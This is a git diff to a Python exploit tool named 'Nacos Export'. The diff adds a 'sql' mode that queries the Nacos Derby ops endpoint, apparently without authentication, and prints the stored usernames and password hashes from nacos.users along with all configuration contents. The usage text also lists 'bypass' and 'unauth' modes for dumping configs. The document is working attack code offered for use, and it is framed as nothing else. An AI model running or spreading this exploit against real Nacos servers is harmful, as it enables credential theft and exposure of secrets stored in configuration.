@@ -109,8 +109,38 @@ def dump_config_content(target: str, token: str):
     
     print("[+] Count: ", count)
 
+def dump_sql(target):
+    # dbs_query = "select * from sys.sysschemas"
+    # users_query = "select * from nacos.users"
+    # content_query = "select * from nacos.config_info"
+
+    count = 0
+    path = "/v1/cs/ops/derby"
+    p1 = {"sql": "select * from nacos.users"}
+    resp = requests.get(target + path, headers=HEADER,  params=p1, verify=False)
+    if resp.status_code == 200:
+        resp_json = resp.json()
+        if resp_json["code"] == 200:
+            print("[+] USERS:")
+            for user in resp_json["data"]:
+                print("User: ", user["USERNAME"])
+                print("Pass: ", user["PASSWORD"])
+                print("")
+
+    p2 = {"sql": "select * from nacos.config_info"}
+    resp = requests.get(target + path, headers=HEADER, params=p2, verify=False)
+    if resp.status_code == 200:
+        resp_json = resp.json()
+        if resp_json["code"] == 200:
+            for content in resp_json["data"]:
+                print_output("None", content["GROUP_ID"], content["DATA_ID"], content["CONTENT"])
+                count = count + 1
+    print("[+] Count: ", count)
+            
+        
+
 def usage(name: str):
-    ver = "v1.0.0"
+    ver = "v1.1.0"
     print("""
  ______________
 < Nacos Export >         @Author: Arm!tage
@@ -125,12 +155,14 @@ Usage:
     python3 {script} <URL> <USERNAME> <PASSWORD>
     python3 {script} <URL> <TOKEN>
     python3 {script} <URL> bypass|unauth
+    python3 {script} <URL> sql
 
 Example:
     python3 {script} http://localhost:8848/nacos nacos nacos
     python3 {script} http://localhost:8848/nacos eyJhbGciOiJIXXXXXXXXXXXX
     python3 {script} http://localhost:8848/nacos unauth
-    """.format(script=name, version=ver))
+    python3 {script} http://localhost:8848/nacos sql
+""".format(script=name, version=ver))
 
 
 if __name__ == '__main__':
@@ -151,6 +183,8 @@ if __name__ == '__main__':
         if sys.argv[2] == "bypass" or sys.argv[2] == "unauth":
             print("[*] Bypass/Unauth")
             dump_config_content(target, "")
+        elif sys.argv[2] == "sql":
+            dump_sql(target)
         else:
             print("[+] Token: ", sys.argv[2])
             print("\n")
